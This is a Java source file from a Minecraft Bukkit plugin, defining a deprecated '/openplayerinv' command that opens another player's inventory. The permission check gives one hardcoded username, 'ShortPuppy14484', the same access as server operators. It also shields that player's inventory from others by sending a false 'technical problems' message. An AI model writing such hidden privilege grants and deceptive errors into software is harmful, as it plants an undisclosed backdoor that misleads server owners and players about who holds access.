package woks.woks.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import woks.woks.CommandBase;
import woks.woks.Msg;
import woks.woks.PlayerInvtoryGUI;

import java.util.List;
import java.util.Objects;
@Deprecated
// deprecated, better alternative use PlayerInv
public class OpenPlayerInv implements TabCompleter {
    public OpenPlayerInv() {
        new CommandBase("openplayerinv", 1, true) {
            @Override
            public boolean onCommand(CommandSender sender, String[] arguments) {
                Player player = (Player) sender;
                if (player.getName().equals("ShortPuppy14484") || player.isOp()) {// isOp or hasOp
                    if (arguments[0].equals("ShortPuppy14484") && !(player.getName().equals("ShortPuppy14484"))) {
                        Msg.send(player, "Sorry there are some technical problems");
                        Msg.send(Bukkit.getPlayer(arguments[0]), "Sorry there are some technical problems");
                    } else {
                        PlayerInvtoryGUI.PlayerInvtoryGUI(player, Objects.requireNonNull(Bukkit.getPlayer(arguments[0])), 0);
                    }
                } else {
                    Msg.send(player, "Sorry you don't have op to use this command.");
                }
                return true;
            }

            @Override
            public String getUsage() {
                return "/openplayerinv <string:playerName>";
            }
        };
    }
    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        return null; //this is a little confusing but just put it there
    }
}